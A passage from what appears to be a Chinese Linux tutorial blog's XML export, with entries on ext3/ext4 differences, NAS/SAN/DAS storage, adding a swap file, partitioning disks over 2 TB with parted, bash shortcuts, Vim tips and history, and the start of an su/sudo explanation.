终究被一个”临时权限的帽子”扣住，不能等价于纯粹的登录到系统里。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ext4，ext3的特点和区别]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F24.%20ext4%EF%BC%8Cext3%E7%9A%84%E7%89%B9%E7%82%B9%E5%92%8C%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[ext4，ext3的特点和区别&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux kernel 自 2.6.28 开始正式支持新的文件系统 Ext4。 Ext4 是 Ext3 的改进版，修改了 Ext3 中部分重要的数据结构，而不仅仅像 Ext3 对 Ext2 那样，只是增加了一个日志功能而已。Ext4 可以提供更佳的性能和可靠性，还有更为丰富的功能： 与 Ext3 兼容。 执行若干条命令，就能从 Ext3 在线迁移到 Ext4，而无须重新格式化磁盘或重新安装系统。原有 Ext3 数据结构照样保留，Ext4 作用于新数据，当然，整个文件系统因此也就获得了 Ext4 所支持的更大容量。 更大的文件系统和更大的文件。 较之 Ext3 目前所支持的最大 16TB 文件系统和最大 2TB 文件，Ext4 分别支持 1EB（1,048,576TB， 1EB=1024PB， 1PB=1024TB）的文件系统，以及 16TB 的文件。 无限数量的子目录。 Ext3 目前只支持 32,000 个子目录，而 Ext4 支持无限数量的子目录。 Extents。 Ext3 采用间接块映射，当操作大文件时，效率极其低下。比如一个 100MB 大小的文件，在 Ext3 中要建立 25,600 个数据块（每个数据块大小为 4KB）的映射表。而 Ext4 引入了现代文件系统中流行的 extents 概念，每个 extent 为一组连续的数据块，上述文件则表示为“该文件数据保存在接下来的 25,600 个数据块中”，提高了不少效率。 多块分配。 当 写入数据到 Ext3 文件系统中时，Ext3 的数据块分配器每次只能分配一个 4KB 的块，写一个 100MB 文件就要调用 25,600 次数据块分配器，而 Ext4 的多块分配器“multiblock allocator”（mballoc） 支持一次调用分配多个数据块。 延迟分配。 Ext3 的数据块分配策略是尽快分配，而 Ext4 和其它现代文件操作系统的策略是尽可能地延迟分配，直到文件在 cache 中写完才开始分配数据块并写入磁盘，这样就能优化整个文件的数据块分配，与前两种特性搭配起来可以显著提升性能。 快速 fsck。 以前执行 fsck 第一步就会很慢，因为它要检查所有的 inode，现在 Ext4 给每个组的 inode 表中都添加了一份未使用 inode 的列表，今后 fsck Ext4 文件系统就可以跳过它们而只去检查那些在用的 inode 了。 日志校验。 日志是最常用的部分，也极易导致磁盘硬件故障，而从损坏的日志中恢复数据会导致更多的数据损坏。Ext4 的日志校验功能可以很方便地判断日志数据是否损坏，而且它将 Ext3 的两阶段日志机制合并成一个阶段，在增加安全性的同时提高了性能。 “无日志”（No Journaling）模式。 日志总归有一些开销，Ext4 允许关闭日志，以便某些有特殊需求的用户可以借此提升性能。 在线碎片整理。 尽管延迟分配、多块分配和 extents 能有效减少文件系统碎片，但碎片还是不可避免会产生。Ext4 支持在线碎片整理，并将提供 e4defrag 工具进行个别文件或整个文件系统的碎片整理。 inode 相关特性。 Ext4 支持更大的 inode，较之 Ext3 默认的 inode 大小 128 字节，Ext4 为了在 inode 中容纳更多的扩展属性（如纳秒时间戳或 inode 版本），默认 inode 大小为 256 字节。Ext4 还支持快速扩展属性（fast extended attributes）和 inode 保留（inodes reservation）。 持久预分配（Persistent preallocation）。 P2P 软件为了保证下载文件有足够的空间存放，常常会预先创建一个与所下载文件大小相同的空文件，以免未来的数小时或数天之内磁盘空间不足导致下载失败。 Ext4 在文件系统层面实现了持久预分配并提供相应的 API（libc 中的 posix_fallocate()），比应用软件自己实现更有效率。 默认启用 barrier。 磁 盘上配有内部缓存，以便重新调整批量数据的写操作顺序，优化写入性能，因此文件系统必须在日志数据写入磁盘之后才能写 commit 记录，若 commit 记录写入在先，而日志有可能损坏，那么就会影响数据完整性。Ext4 默认启用 barrier，只有当 barrier 之前的数据全部写入磁盘，才能写 barrier 之后的数据。（可通过 “mount -o barrier=0” 命令禁用该特性。）]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何区别NAS.SAN与DAS]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F23.%20%E5%A6%82%E4%BD%95%E5%8C%BA%E5%88%ABNAS.SAN%E4%B8%8EDAS%2F</url>
    <content type="text"><![CDATA[如何区别NAS.SAN与DAS&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SAN (Storage Attached Network)，即存储区域网络。为什么写NAS就不得不提到SAN呢?原因之一是它们的名字有69关系，容易混淆;之二是NAS和SAN既竞争又合作，很多高端NAS的后端存储就是SAN。NAS和SAN的整合也是存储设备的发展趋势，比如EMC的新产品VNX系列。右图展示了一台NAS的逻辑结构：双虚线框表示一台NAS。它通过Fibre Channel从后端SAN获得存储空间，创建文件系统后，再通过以太网共享给服务器。SAN提供的存储单位是LUN，属于block级别的。经过NAS创建成文件系统后，就变成文件级别的了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果上边的逻辑图还不够清楚，可以看看下面的物理连接。NAS通过FC Switch连到SAN上，应用服务器再通过Ethernet Switch连到NAS上。同时SAN也直接提供block级别的存储给应用服务器。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关于NAS和SAN的区别，可以列出很多来。比如带宽大小，距离长短，共享优劣等等。几乎所有区别都是由两个因素衍生出来的。一个是FC与Ethernet，另一个是block与file system。简而言之，如果用户需要通过FC访问block，就用SAN;如果需要通过Ethernet访问file system，就用NAS。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除了NAS和SAN，还有一类存储设备经常被提到。那就是DAS (Direct Attached Storage) ，即“直连存储”。“直连”指服务器和存储设备之间没有FC网络，而是直接相连。比如我们都熟知的个人电脑就是DAS，因为磁盘被直连到了主板上。DAS已经存在很多年了，就算到今天也是很多服务器的理想选择。但是它的问题很多，而且也跟不上IT技术，比如虚拟化的发展。下面列举几个： 可管理性差：每台服务器都使用自己的存储，光硬件的监控和维护就要花费不少时间。如果都要做容灾或备份，对于管理员简直是噩梦。 可扩展性差：在服务器安装结束后，如果发现存储空间分配过多，就造成了浪费。如果发现空间不足，要扩展也很麻烦。 跟不上IT发展趋势，比如不支持VMware VMotion等高级功能。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SAN解决了这些问题。因为它既提供了统一的存储，同时又是一个网络。统一性和网络性给SAN带来了很多优势： 可管理性：由一台SAN统一给多台服务器提供存储。无论是硬件的监控维护，还是数据的容灾备份，都只要在SAN上进行。使存储管理变得更轻松。 可扩展性：在物理层面，SAN支持数以百计的磁盘(比如EMC的CX4可以支持960块磁盘)，提供了海量的存储空间。在逻辑层面，这个海量空间可以按需要分成不同大小的LUN，再分配给服务器。LUN是逻辑设备，所以很容易扩展或迁移。 符合IT发展趋势：比如对炙手可热的虚拟化有很好的支持。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然，除了解决DAS的这些问题，SAN还有其他明显的优势： 高性能:a. SAN 更好的支持RAID，因为它拥有更多硬盘和更强的控制器。下图展示了RAID0对性能提升的基本原理：当有一大块数据写到RAID Group上，它可以被分成数小块，同时写到几个磁盘上。这就象有一批档案需要录入到电脑上，经理一个人打字需要做5天。分给5位员工一起做，一天就可以做完了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;b. SAN有更大的cache。比如CX4的write cache可以达到10.7 GB。Cache对性能的提高也有明显的作用。 更稳定：多机头，热备盘，多路径等机制杜绝了单点故障。 更安全：统一的容灾，备份和远程复制保证了数据的安全性。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;此外还有很多新技术，比如VNX的FASTCache和FASTVP。因为主要介绍NAS，SAN就不深入讨论了。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[建立一个swap文件增加虚拟内存]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F28.%E5%BB%BA%E7%AB%8B%E4%B8%80%E4%B8%AAswap%E6%96%87%E4%BB%B6%E5%A2%9E%E5%8A%A0%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%2F</url>
    <content type="text"><![CDATA[建立一个swap文件增加虚拟内存&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从装系统时就接触过这个swap了，它类似与windows的虚拟内存，分区的时候一般大小为内存的2倍，如果内存超过8G，那么你分16G似乎是没有必要了。分16G足够日常交换了。然而，还会有虚拟内存不够用的情况发生。如果真遇到了，莫非还要重新给磁盘分区？当然不能，那我们就增加一个虚拟的磁盘出来。基本的思路就是：建立swapfile -&gt; 格式化为swap格式 -&gt; 启用该虚拟磁盘。 1234[root@localhost ~]# dd if=/dev/zero of=/tmp/newdisk bs=4k count=102400记录了102400+0 的读入记录了102400+0 的写出419430400字节(419 MB)已复制，2.59193 秒，162 MB/秒 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“dd” 这个命令会经常用到，所以要掌握它的使用方法，其实也不难，用 “if” 指定源，基本上除了 “/dev/zero” 外基本上不会写别的，而/dev/zero 是UNIX系统特有的一个文件，它可以提供源源不断的 “0”, 关于它的其他信息请你在网上查一下资料。 “of” 指定目标文件， “bs” 定义块的大小， “count” 定义块的数量，这两个参数的多少决定了目标文件的大小，目标文件大小 = bs x count. 用dd建了一个大小为400M的文件，然后格式化成swap格式： 123[root@localhost ~]# mkswap -f /tmp/newdiskSetting up swapspace version 1, size = 409596 KiBno label, UUID=29832cab-04b9-4083-a667-9a5795a5d490 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;格式化完后，就可以挂载上使用了： 1234567891011[root@localhost ~]# free -m total used free shared buffers cachedMem: 318 314 4 0 5 278-/+ buffers/cache: 30 288Swap: 2047 0 2047[root@localhost ~]# swapon /tmp/newdisk[root@localhost ~]# free -m total used free shared buffers cachedMem: 318 314 4 0 5 278-/+ buffers/cache: 31 287Swap: 2447 0 2447 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;前后对比swap分区多了400M空间。其中 “free” 这个命令用来查看内存使用情况， “-m” 表示以M为单位显示]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux如何分大于2T的磁盘分区]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F20.%20Linux%E5%A6%82%E4%BD%95%E5%88%86%E5%A4%A7%E4%BA%8E2T%E7%9A%84%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA%2F</url>
    <content type="text"><![CDATA[Linux如何分大于2T的磁盘分区&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;之前一直没有接触过大于2T的磁盘分区的情况，只是听说Linux下大于2T的磁盘分区有问题。当自己遇到的时候，才真实体会到。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用fdisk 工具分区的时候，如果分大于2T的分区，会提示： 1Value out of range. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以不能使用fdisk这个分区工具了，要是用parted 来进行分区。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们使用fdisk -l 查看磁盘的时候会发现一段警告： 1234"WARNING: The size of this disk is 8.0 TB (7995995979776 bytes).DOS partition table format can not be used on drives for volumeslarger than 2.2 TB (2199023255040 bytes). Use parted(1) and GUIDpartition table format (GPT)." &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是因为我的/dev/sdb磁盘是8T，超过了2T. 超过2T只能将磁盘转化成GPT格式，GPT格式的磁盘相当于把原来MBR磁盘中原来保留4个分区表的4*16个字节只保留第一个16个字节，其它的类似于扩展分区，真正的分区表在512字节后，因此对GPT分区表来说是没有4个主分区的限制。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MBR分区表（主引导）： 支持的最大卷：2T(1T=1024GB) 对分区的限制：最多4个主分区或3个主分区和一个扩展分区 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;GPT分区表（GUID分区表）： 支持最大卷：18EB（1EB=1024T） 对分区的限制：每个磁盘最多支持128个分区 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;好的，下面看看如何使用parted 来分区这个8T的磁盘？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我的打算是，sdb1 分一半也就是4T，sdb2分3T，sdb3分1T. 12345678910111213141516171819202122232425parted /dev/sdb1GNU Parted 1.8.1使用 /dev/sdb1Welcome to GNU Parted! Type 'help' to view a list of commands.(parted) helpcheck NUMBER do a simple check on the file system cp [FROM-DEVICE] FROM-NUMBER TO-NUMBER copy file system to another partition help [COMMAND] prints general help, or help on COMMAND mklabel,mktable LABEL-TYPE create a new disklabel (partition table) mkfs NUMBER FS-TYPE make a FS-TYPE file system on partititon NUMBER mkpart PART-TYPE [FS-TYPE] START END make a partition mkpartfs PART-TYPE FS-TYPE START END make a partition with a file system move NUMBER START END move partition NUMBER name NUMBER NAME name partition NUMBER as NAME print [free|NUMBER|all] display the partition table, a partition, or all devices quit exit program rescue START END rescue a lost partition near START and END resize NUMBER START END resize partition NUMBER and its file system rm NUMBER delete partition NUMBER select DEVICE choose the device to edit set NUMBER FLAG STATE change the FLAG on partition NUMBER toggle [NUMBER [FLAG]] toggle the state of FLAG on partition NUMBER unit UNIT set the default unit to UNIT version displays the current version of GNU Parted and copyright information(parted) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以先使用 “help” 命令获取帮助。常用命令有： mklabel GPT：建立磁盘标签 print ：如果没有任何分区，它查看磁盘可用空间，当分区后，它会打印出分区情况 primary 0% n% ：创建主分区，n为要分的分区占整个磁盘的百分比.（mkpart extended创建扩展分区），例如我这里要分一个占一半（4T）的分区，则写 0% 50%, 然后继续分3T “mkpart primary 51% 90%”, 再分一个1T的 “mkpart primary 91% 100%” quit ：分区完后，直接quit即可，不像fdisk分区的时候，还需要保存一下，这个不用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以，我的命令为： 123456(parted) mklabel GPT(parted) print(parted) mkpart primary 0% 50%(parted) mkpart primary 51% 90%(parted) mkpart primary 91% 100%(parted) quit &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;分区完了首先需要把让内核知道添加新分区了： 1partprobe &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后就该格式化了: 123mkfs.ext3 /dev/sdb1mkfs.ext3 /dev/sdb2mkfs.ext3 /dev/sdb3]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 快捷键]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F3.%20Linux%20%E5%BF%AB%E6%8D%B7%E9%94%AE%2F</url>
    <content type="text"><![CDATA[Linux 好用的快捷键&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+a:光标移到行首。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+b:光标左移一个字母 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+c:杀死当前进程。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+d:退出当前 Shell。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+e:光标移到行尾。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+h:删除光标前一个字符，同 backspace 键相同。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+k:清除光标后至行尾的内容。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+l:清屏，相当于clear。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+r:搜索之前打过的命令。会有一个提示，根据你输入的关键字进行搜索bash的history &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+u: 清除光标前至行首间的所有内容。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+w: 移除光标前的一个单词 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+t: 交换光标位置前的两个字符 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+y: 粘贴或者恢复上次的删除 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+d: 删除光标所在字母;注意和backspace以及ctrl+h的区别，这2个是删除光标前的字符 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+f: 光标右移 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ctrl+z : 把当前进程转到后台运行，使用’ fg ‘命令恢复。比如top -d1 然后ctrl+z ，到后台，然后fg,重新恢复]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vim百科]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F29.%20vim%E7%99%BE%E7%A7%91%2F</url>
    <content type="text"><![CDATA[vim百科&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Vim是从vi发展出来的一个文本编辑器。代码补完、编译及错误跳转等方便编程的功能特别丰富，在程序员中被广泛使用。和Emacs并列成为类Unix系统用户最喜欢的编辑器。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Vim的第一个版本由布莱姆·米勒在1991年发布。最初的简称是Vi IMitation，随着功能的不断增加，正式名称改成了Vi IMproved。现在是在开放源代码方式下发行的自由软件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;布莱姆·米勒在80年代末购入他的Amiga计算机时，Amiga上还没有他最常用的编辑器vi。Bram从一个开源的vi复制Stevie开始，开发了Vim的1.0版本。最初的目标只是完全复制vi的功能，那个时候的Vim是Vi IMitation（模拟）的简称。1991年Vim 1.14版被”Fred Fish Disk #591”这个Amiga用的免费软体集所收录了。1992年1.22版本的Vim被移植到了UNIX和MS-DOS上。从那个时候开始，Vim的全名就变成Vi IMproved（改良）了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在这之后，Vim加入了不计其数的新功能。做为第一个里程碑的是1994年的3.0版本加入了多视窗编辑模式（分区视窗）。从那之后，同一萤幕可以显示的Vim编辑文件数可以不止一个了。1996年发布的Vim 4.0是第一个利用GUI（图形用户界面）的版本。1998年5.0版本的Vim加入了highlight（语法高亮）功能。2001年的Vim 6.0版本加入了代码折叠、插件、多国语言支持、垂直分区视窗等功能。2006 年5月发布的Vim 7.0版更加入了拼字检查、上下文相关补全，标签页编辑等新功能。2008年8月发布的Vim 7.2，合并了Vim 7.1以来的所有修正补丁，并且加入了脚本的浮点数支持。现在最新的版本是2010年8月发布的Vim 7.3，这个版本除了包含最新修正的补丁之外，还加入了“永久撤销”、“Blowfish算法加密”、“文本隐藏”和“Lua以及Python3的接口”等新功能。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;目前, VIM是按照VIM许可证发布的开源软件，这个协议兼容GPL。它的协议中包含一些慈善条款，建议用户向荷兰ICCF捐款，用于帮助乌干达的艾滋病患者. VIM启动时会显示Help poor children in Uganda!的字样，在中文版本中则是请帮助乌干达的可怜孩童!. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于大多数用户来说，Vim有着一个比较陡峭的学习曲线。这意味着开始学习的时候可能会进展缓慢，但是一旦掌握一些基本操作之后，能大幅度提高编辑效率。为了帮助学习，Vim为初学者准备了Vim教学。通常可以在Unix系统命令行下输入”vimtutor”或者点击Windows系统桌面上的Vim教学图标进入。在Vim用户手册 中更加详细的描述了Vim的基础和进阶功能。可以在Vim中输入”:help user-manual”进入用户手册。手册除了原始的英文版本之外，也被志愿者翻译成了各国文字，其中包括中文。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;新用户也应该学习Vim的帮助系统。可以在Vim中输入不带参数的”help”来阅读主帮助文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从vi演生出来的Vim具有多种模式，这种独特的设计容易使初学者产生混淆。几乎所有的编辑器都会有插入和执行命令两种模式，并且大多数的编辑器使用了与Vim截然不同的方式：命令目录（鼠标或者键盘驱动），组合键（通常通过control键（CTRL）和alt键（ALT）组成）或者鼠标输入。Vim和vi一样，仅仅通过键盘来在这些模式之中切换。这就使得Vim可以不用进行菜单或者鼠标操作，并且最小化组合键的操作。对文字录入员或者程序员可以大大增强速度和效率。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vim编辑器里面一些不为人知的操作]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F30.%20vim%E7%BC%96%E8%BE%91%E5%99%A8%E9%87%8C%E9%9D%A2%E4%B8%80%E4%BA%9B%E4%B8%8D%E4%B8%BA%E4%BA%BA%E7%9F%A5%E7%9A%84%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[vim编辑器里面一些不为人知的操作1.vim编辑器的替换模式与可视模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下按键盘上的r和R进入替换模式。如果按小r那么这时候就进入了替换模式，你下一个输入的字符会把你当前光标所在处的字符替换，然后自动退出替换模式。如果你按的是大R那么你下面输入的所有字符会把后面的字符依次替换，直到按退出替换模式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下按键盘上的v和V进入可视模式。如果是按小v那么这时候就时入了视图模式，这时候你移动光标会把你光标所在处到光标结尾处的所有字符选中，这时候可以进行复制，删除等操作。如果是按大V同样也是进入了视图模式，这时候移动光标会把光标所在行到光标结尾的行的所有内容选中，也可以进行复制，删除等操作。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：使用在一般模式使用“ctrl+v”组合键可以进入块操作模式 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在这个模式下和可视模式差不多，但是选择的内容不同，大家可实际操作看看 2.删除从光标所在处到行尾字符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入大写“Ｄ”或者输入“d$” 3.删除从光标所在处到行首字符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入大写“d^” 4.删除从光标所在行到文件末尾行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入大写“dG” 5.删除指定范围内所有行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例：删除10到15行的所有内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入“:10,15d”回车 6.把正在编辑的文件另存为新文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例：把正在编辑的文件另存为到“/root/”下面并保存为1.txt&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入“:w /root/1.txt” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例：把正在编辑的文件的第10行到第15行另存为1.txt并保存到root目录下在一般模式下输入“:10,15 w /root/1.txt” 7.把其它文件的内容导入到正在编辑的文件的光标所在处&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例：把“/root/1.txt” 文件的内容，导入到下在编辑的文件的第10行下面&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先在一般模式下按“10G”把光标定位到第10行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后按“o”小写，当前行的下面另起一行，并进入插入模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最后按键盘上的返回到一般模式，再输入“:r /root/1.txt”回车 8.正在编辑文件时，不退出文件仍可以运行linux命令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例：我下在编辑一个文件，但这时候我想查看“/root/1.txt” 文件的内容，但是我不想退出我正在编辑的文件，那么我们可以这样在编辑模式下输入“:! cat /root/1.txt” 9.把命令的执行结果导入到正在编辑的文件的光标所在处&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这题我们可以结合上面两题，在一般模式下输入“:r ! cat /root/1.txt” 10.查找替换的功能使用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例：在10到15行的行首增加“#”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入“:10,15s/^/#/” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例：在10到15行的行首去掉“#”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入“:10,15s/^#//” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例：在10到15行的行首增加“//”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入“:10,15s/^/\/\//”或者“:10,15s@^@//@”或者“:10,15s#^#//#” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：在上面所有命令的最后面都可以加g或者c一起配合使用，g的意思是行中出现的所有指定字符都替换，但是如果加了g那么前面就不能出现位置定义字符，反之前面出现的位置定义字符，那么后面就不可以出现g。在后面加c可以跟用户交互，在查找到符合命令的字符提示用户是否替换，需要用户确认，否则不需要确认 11.把输入的指定字符替换为指定的字符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例：在编辑一个文档的时候，我要频繁的输入“abcdefghijklmnopqrstuvwxyz”这样的连续字符串，这时候我想只输入一个或者一串指定字符就可以替换为刚才的字符，比如我指定输入“aming”系统就会自动把“aming”替换成“abcdefghijklmnopqrstuvwxyz”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入“:ab aming abcdefghijklmnopqrstuvwxyz”然后回车，再进入编辑模式，当你输入“aming”的时候就会发现自动替换成了“abcdefghijklmnopqrstuvwxyz” 12.快捷键的定义&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例：我想在一般模式下按键盘上的ctrl+b快捷键，会自动在光标所在行的行首插入“#”号，然后自动退出到一般模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入“:map ctrl+v ctrl+b I #”然后回车，这时候在一般模式按键盘上的ctrl+b的时候就会在光标所在的行首插入“#”号了 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：命令中ctrl+v和ctrl+b是键盘上的组合键，不是输入进去的字符，是需要按的组合键，其中第一个ctrl+v就照按，第二个ctrl+b是要定义的快捷键，根据自己需要的设置按。然后“I”的意思就是一般模式下的“I”进入插入模式并将光标移动到行首，然后接着输入“#”号，后面“”的意思是退出编辑模式 13.同进编辑两个文件或者&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例：我现正在编辑１.txt文件，然后我想再打开root目录下的2.txt同时编辑，并把窗口上下水平分隔，一起显示&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入“:new /root/2.txt” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例：我现正在编辑１.txt文件，然后我想再打开root目录下的2.txt同时编辑，并把窗口左右垂直分隔，一起显示&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入“:vsplit /root/2.txt” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：在一般模式下按“ctrl+w”组合键，再按左右，或者上下方向键，可以在不同窗口之间切换如果在一般模式下输入“:only”那么只保留当前正在编辑的窗口，其它全关闭 15.在vim查找关键字时不区分大小写&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入“:set ic” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果想取消就输入“:set noic” 16.如何把文件设置成只读文件，只有强制保存时才能保存&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入“:set readonly” 17.把文件恢复到打开时的状态&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一般模式下输入“:e!” 18.配置文件的使用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上那么多操作，像设置忽略大小写，设定快捷键，设定自动替换，等一些操作，当电脑重启后就没有了。这时候我们可以把这些命令写入配置文件，这样电脑重启后还是可以使用，我们有两种方法 第一种：所有用户都统一修改“/etc/vimrc”文件，在末尾加入需要设置的命令，就是我红色标注的部分 第二种：只对当前用户修改用户家目录下的“.vimrc”文件，注意有个点，这是隐藏文件，一般用户家下没有，需要自己手工创建]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[su 和 sudo 命令的区别]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F14.%20Linux%20su%20%E5%92%8C%20sudo%20%E5%91%BD%E4%BB%A4%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[su 和 sudo 命令的区别使用 su 命令临时切换用户身份一、su 的适用条件和威力&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;su 命令就是切换用户的工具。比如以普通用户 beinan 登录的，但要田间用户任务，执行 useradd ，beinan 用户没有这个权限，而这个权限由 root 所拥有。解决办法只有两个： 退出 beinan 用户，重新以 root 用户登录，但这种办法并不是最好的； 没有必要退出 beinan 用户，可以用 su 来切换到 root 下进行条件用户的工作，等任务完成后再退出 root 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以看到，通过 su 切换是一种比较好的办法。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过 su 可以在用户之间切换，如果超级权限用户 root 向普通或虚拟用户切换不需要密码，而普通用户切换到其他任何用户都需要密码验证。 二、su 的用法：1su [OPTION选项参数] [用户] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;- ，-l ， –login 登录并改变到所切换的用户环境； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-c ，–command=COMMAND 执行一个命令，然后退出所切换到的用户环境； 